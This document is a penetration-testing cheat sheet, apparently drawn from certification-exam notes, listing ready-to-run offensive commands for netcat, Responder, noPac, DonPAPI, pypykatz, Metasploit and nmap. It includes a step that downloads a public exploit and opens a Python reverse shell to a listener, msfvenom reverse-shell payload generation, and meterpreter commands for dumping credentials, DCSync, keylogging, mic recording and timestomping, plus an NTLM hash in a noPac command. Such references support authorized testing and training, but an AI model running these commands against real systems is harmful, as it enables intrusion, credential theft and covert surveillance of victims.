# Misc Tools

## Netcat (nc)

> Source: `01101100-C0D3X-00110110.md` → `Enumeration > Netcat (nc)`

Netcat is versatile; it can catch reverse shells and scan ports.


## Port 1978 - unisql (MouseServer - BoF)

> Source: `01101100-C0D3X-00110110.md` → `Enumeration > Netcat (nc) > Port 1978 - unisql (MouseServer - BoF)`

```
search exploits, below works sometimes
https://github.com/H4rk3nz0/PenTesting/blob/main/Exploits/wifi%20mouse/wifi-mouse-server-rce.py (WORKS)
```


## Port Scanning (UDP)

> Source: `01101100-C0D3X-00110110.md` → `Enumeration > Netcat (nc) > Port Scanning (UDP)`

```bash
nc -nv -u -z -w 1 <IP> <portrange1>-<portrange2>
```


## Responder (MITM Attack for NTLM Hashes)

> Source: `01101100-C0D3X-00110110.md` → `Enumeration > Service Enumeration > Responder (MITM Attack for NTLM Hashes)`

```bash
responder -I <interface>
```


## Exiftool

> Source: `01101100-C0D3X-00110110.md` → `Enumeration > Service Enumeration > Exiftool`

```bash
exiftool -a -u file.pdf
```

> **Description:** View metadata of files.


## Grab Client-side IPs

> Source: `01101100-C0D3X-00110110.md` → `Enumeration > Service Enumeration > Grab Client-side IPs`

> **Techniques:** Canarytokens, IP logger like Grabify, or JavaScript fingerprinting libraries such as fingerprint.js.


## printerbug

> Source: `01101100-C0D3X-00110110.md` → `Python tools > printerbug`

https://github.com/dirkjanm/krbrelayx
```
python3 printerbug.py <domain>/'<username>':'<password>'@<dc-host> <unconstrained-host>   
```


## PySQLTools using NTLM

> Source: `01101100-C0D3X-00110110.md` → `Tools > PySQLTools using NTLM`

```
python3 PySQLTools.py <domain>/'<username>'@<ip> -hashes :<nthash> -windows-auth
```


## PySQLTools using Password

> Source: `01101100-C0D3X-00110110.md` → `Tools > PySQLTools using Password`

```
python3 PySQLTools.py <domain>/'<username>':'<password>'@<ip> -windows-auth
```


## Port Scanning (TCP)

> Source: `01101100-RUN3-00110110.md` → `Enumeration > Netcat (nc) > Port Scanning (TCP)`

```bash
nc -nvv -w 1 -z <IP> <portrange1>-<portrange2>
```

Port 3003 - cgms
```bash
nc -nv $IP 3003 #run this

help #run this

version #run this

sudo apt-get update

sudo apt-get install python3-venv

python3 -m venv myenv

source myenv/bin/activate

pip3 install aerospike


wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py
python3 cve2020-13151.py --ahost=192.168.208.143 --aport=3000 --pythonshell --lhost=192.168.45.208 --lport=443

nc -nlvp 443
```


## Port Scanning (TCP)

> Source: `01111110-SCR0LL-01111110.md` → `Enumeration > Netcat (nc) > Port Scanning (TCP)`

```bash
nc -nvv -w 1 -z <IP> <portrange1>-<portrange2>
```

---

## sqsh

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Commands > Database Analysis > sqsh`

```
sqsh -S <RHOST> -U <USERNAME>
sqsh -S '<RHOST>' -U '<USERNAME>' -P '<PASSWORD>'
sqsh -S '<RHOST>' -U '.\<USERNAME>' -P '<PASSWORD>'
```
```
EXEC master.sys.xp_dirtree N'C:\inetpub\wwwroot\',1,1;
```


## DonPAPI

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > DonPAPI`

```
DonPAPI <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
DonPAPI -local_auth <USERNAME>@<RHOST>
DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>
DonPAPI -laps <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
```


## fcrack

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > DonPAPI > fcrack`

```
fcrackzip -u -D -p /PATH/TO/WORDLIST/<WORDLIST> <FILE>.zip
```


## gpp-decrypt

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > DonPAPI > fcrack > gpp-decrypt`

```
python3 gpp-decrypt.py -f Groups.xml
python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

## nopac - GenericAll (PrivEsc)

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > DonPAPI > nopac - GenericAll (PrivEsc)`

```shell
python ~/offsec/Tools/noPac/noPac.py resourced.local/L.Livingstone -hashes 'aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808' -dc-ip 192.168.175.175 -dc-host resourcedc -shell --impersonate administrator -use-ldap

# now add Domain Admin user and PSexec OR RDP
```

## pypykatz

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > DonPAPI > pypykatz`

```
pypykatz lsa minidump lsass.dmp
pypykatz registry --sam sam system
```

## Metasploit

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > DonPAPI > Exploitation Tools > Metasploit`

```
$ sudo msfdb run                   // start database
$ sudo msfdb init                  // database initialization
$ msfdb --use-defaults delete      // delete existing databases
$ msfdb --use-defaults init        // database initialization
$ msfdb status                     // database status
msf6 > workspace                   // metasploit workspaces
msf6 > workspace -a <WORKSPACE>    // add a workspace
msf6 > workspace -r <WORKSPACE>    // rename a workspace
msf6 > workspace -d <WORKSPACE>    // delete a workspace
msf6 > workspace -D                // delete all workspaces
msf6 > db_nmap <OPTIONS>           // execute nmap and add output to database
msf6 > hosts                       // reads hosts from database
msf6 > services                    // reads services from database
msf6 > vulns                       // displaying vulnerabilities
msf6 > search                      // search within metasploit
msf6 > set RHOST <RHOST>           // set remote host
msf6 > set RPORT <RPORT>           // set remote port
msf6 > run                         // run exploit
msf6 > spool /PATH/TO/FILE         // recording screen output
msf6 > save                        // saves current state
msf6 > exploit                     // using module exploit
msf6 > payload                     // using module payload
msf6 > auxiliary                   // using module auxiliary
msf6 > encoder                     // using module encoder
msf6 > nop                         // using module nop
msf6 > show sessions               // displays all current sessions
msf6 > sessions -i 1               // switch to session 1
msf6 > sessions -u <ID>            // upgrading shell to meterpreter
msf6 > sessions -k <ID>            // kill specific session
msf6 > sessions -K                 // kill all sessions
msf6 > jobs                        // showing all current jobs
msf6 > show payloads               // displaying available payloads
msf6 > set VERBOSE true            // enable verbose output
msf6 > set forceexploit true       // exploits the target anyways
msf6 > set EXITFUNC thread         // reverse shell can exit without exit the program
msf6 > set AutoLoadStdapi false    // disables autoload of stdapi
msf6 > set PrependMigrate true     // enables automatic process migration
msf6 > set PrependMigrateProc explorer.exe                        // auto migrate to explorer.exe
msf6 > use post/PATH/TO/MODULE                                    // use post exploitation module
msf6 > use post/linux/gather/hashdump                             // use hashdump for Linux
msf6 > use post/multi/manage/shell_to_meterpreter                 // shell to meterpreter
msf6 > use exploit/windows/http/oracle_event_processing_upload    // use a specific module
C:\> > Ctrl + z                                  // put active meterpreter shell in background
meterpreter > loadstdapi                         // load stdapi
meterpreter > background                         // put meterpreter in background (same as "bg")
meterpreter > shell                              // get a system shell
meterpreter > channel -i <ID>                    // get back to existing meterpreter shell
meterpreter > ps                                 // checking processes
meterpreter > migrate 2236                       // migrate to a process
meterpreter > getuid                             // get the user id
meterpreter > sysinfo                            // get system information
meterpreter > search -f <FILE>                   // search for a file
meterpreter > upload                             // uploading local files to the target
meterpreter > ipconfig                           // get network configuration
meterpreter > load powershell                    // loads powershell
meterpreter > powershell_shell                   // follow-up command for load powershell
meterpreter > powershell_execute                 // execute command
meterpreter > powershell_import                  // import module
meterpreter > powershell_shell                   // shell
meterpreter > powershell_session_remove          // remove
meterpreter > powershell_execute 'Get-NetNeighbor | Where-Object -Property State -NE "Unreachable" | Select-Object -Property IPAddress'                                // network discovery
meterpreter > powershell_execute '1..254 | foreach { "<XXX.XXX.XXX>.${_}: $(Test-Connection -TimeoutSeconds 1 -Count 1 -ComputerName <XXX.XXX.XXX>.${_} -Quiet)" }'    // network scan
meterpreter > powershell_execute 'Test-NetConnection -ComputerName <RHOST> -Port 80 | Select-Object -Property RemotePort, TcpTestSucceeded'                            // port scan
meterpreter > load kiwi                          // load mimikatz
meterpreter > help kiwi                          // mimikatz help
meterpreter > kiwi_cmd                           // execute mimikatz native command
meterpreter > lsa_dump_sam                       // lsa sam dump
meterpreter > dcsync_ntlm krbtgt                 // dc sync
meterpreter > creds_all                          // dump all credentials
meterpreter > creds_msv                          // msv dump
meterpreter > creds_kerberos                     // kerberos dump
meterpreter > creds_ssp                          // ssp dump
meterpreter > creds_wdigest                      // wdigest dump
meterpreter > getprivs                           // get privileges after loading mimikatz
meterpreter > getsystem                          // gain system privileges if user is member of administrator group
meterpreter > hashdump                           // dumps all the user hashes
meterpreter > run post/windows/gather/checkvm    // check status of the target
meterpreter > run post/multi/recon/local_exploit_suggester    // checking for exploits
meterpreter > run post/windows/manage/enable_rdp              // enables rdp
meterpreter > run post/multi/manage/autoroute                 // runs autoroutes
meterpreter > run auxiliary/server/socks4a                    // runs socks4 proxy server
meterpreter > keyscan_start                                   // enabled keylogger
meterpreter > keyscan_dump                                    // showing the output
meterpreter > screenshare                                     // realtime screen sharing
meterpreter > screenshare -q 100                              // realtime screen sharing
meterpreter > record_mic                                      // recording mic output
meterpreter > timestomp                                       // modify timestamps
meterpreter > execute -f calc.exe                             // starts a program on the victim
meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1    // port forwarding
```
```
proxychains -q msfconsole
```
```
/home/<USERNAME>/.msf4/loot/20200623090635_default_<RHOST>_nvms.traversal_680948.txt
```


## Generate Payload

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > DonPAPI > Exploitation Tools > Metasploit > Meterpreter Listener > Generate Payload`

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter_payload.exe
```
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run
```


## Download Files

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > DonPAPI > Exploitation Tools > Metasploit > Meterpreter Listener > Download Files`

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe
```
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run
```
```
.\<FILE>.exe
```
```
meterpreter > download *
```

---
## NMAP

> Source: `01101100-C0D3X-00110110.md` → `NMAP`

```
# Scan a single IP
nmap 192.168.1.1

# Scan multiple IPs
nmap 192.168.1.1 192.168.1.2

# Scan a range
nmap 192.168.1.1-254

# Scan a subnet
nmap 192.168.1.0/24
```

```
# TCP SYN port scan (Default)
nmap -sS 192.168.1.1

# TCP connect port scan (Default without root privilege)
nmap -sT 192.168.1.1

# UDP port scan
nmap -sU 192.168.1.1

# TCP ACK port scan
nmap  -sA 192.168.1.1
```

```
# Disable port scanning. Host discovery only.
nmap -sn 192.168.1.1

# Disable host discovery. Port scan only.
nmap -Pn 192.168.1.1

# Never do DNS resolution
nmap -n 192.168.1.1
```

```
# Port scan from service name
nmap 192.168.1.1 -p http, https

# Specific port scan
nmap 192.168.1.1 -p 80,9001,22

# All ports
nmap 192.168.1.1 -p-

# Fast scan 100 ports
nmap -F 192.168.1.1

# Scan top ports
nmap 192.168.1.1 -top-ports 200
```

```
# Aggresive scanning (Bad Opsec). Enables OS detection, version detection, script scanning, and traceroute.
nmap -A 192.168.1.1

# Version detection scanning
nmap -sV 192.168.1.1

# Version detection intensity from 0-9
nmap -sV -version-intensity 7 192.168.1.1

# OS detecion
nmap -O 192.168.1.1

# Hard OS detection intensity
nmap -O -osscan-guess 192.168.1.1
```

```
# Paranoid (0) Intrusion Detection System evasion
nmap 192.168.1.1 -T0

# Insane (5) speeds scan; assumes you are on an extraordinarily fast network
nmap 192.168.1.1 -T5

# Send packets no slower than <number> per second
nmap 192.168.1.1 --min-rate 1000
```


## NSE Scripts

> Source: `01101100-C0D3X-00110110.md` → `NMAP > NSE Scripts`

```
# Scan with a single script. Example banner
nmap 192.168.1.1 --script=banner

# NSE script with arguments
nmap 192.168.1.1 --script=banner --script-args <arguments>
```

```
# Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters
nmap -f 192.168.1.1

# Set your own offset size(8, 16, 32, 64)
nmap 192.168.1.1 --mtu 32

# Send scans from spoofed IPs
nmap 192.168.1.1 -D 192.168.1.11, 192.168.1.12, 192.168.1.13, 192.168.1.13
```


## Output

> Source: `01101100-C0D3X-00110110.md` → `NMAP > Output`

```
# Normal output to the file normal.file
nmap 192.168.1.1 -oN scan.txt

# Output in the three major formats at once
nmap 192.168.1.1 -oA scan
```


## Rustscan

> Source: `01101100-C0D3X-00110110.md` → `Enumeration > Rustscan`

```bash
rustscan -a 10.10.10.10 -t 2000 -b 2000 -- -A -sVC -Pn
```

> **Note:** The `--` indicates that the following arguments are passed directly to Nmap. Rustscan might miss some open ports, so it's good practice to also run a more thorough Nmap scan.


## Custom Tool

> Source: `01101100-C0D3X-00110110.md` → `Enumeration > Custom Tool`

```bash
./bettermap.sh <IP>


---
IP=192.168.x.x
sudo nmap $IP -p- --packet-trace --disable-arp-ping -Pn -n -sT -oA $IP -T4 | grep open; portrange=$(cat $IP.xml | grep "..open\"" | cut -d" " -f 3 | cut -d"\"" -f 2 | paste -sd, - | sed 's/,$//');nmap $IP -p $portrange -sV -sC -Pn -A -oA $IP.openServices;  xsltproc $IP.openServices.xml -o $IP.html

# performs a TCPconnect scan for all ports, then stores the open ports in another nmap command to perform version enumeration, then prepares a html webpage for a clean report
```


## Nmap NSE Scripts for Exploits

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Service Exploitations > Nmap NSE Scripts for Exploits`

```bash
grep Exploits /usr/share/nmap/scripts/*.nse
```

```bash
nmap --script-help=clamav-exec.nse
```

---
## Tmux

> Source: `01101100-C0D3X-00110110.md` → `Tmux`

```
# Start a new tmux session
tmux new -s <name>

# Start a new session or attach to an existing session named mysession
tmux new-session -A -s <name>

# List all sessions
tmux ls

# kill/delete session
tmux kill-session -t <name>

# kill all sessions but current
tmux kill-session -a

# attach to last session
tmux a
tmux a -t <name>

# start/stop logging with tmux logger
prefix + [Shift + P]

# split tmux pane vertically
prefix + [Shift + %}

# split tmux pane horizontally
prefix + [Shift + "]

# switch between tmux panes
prefix + [Shift + O]
```
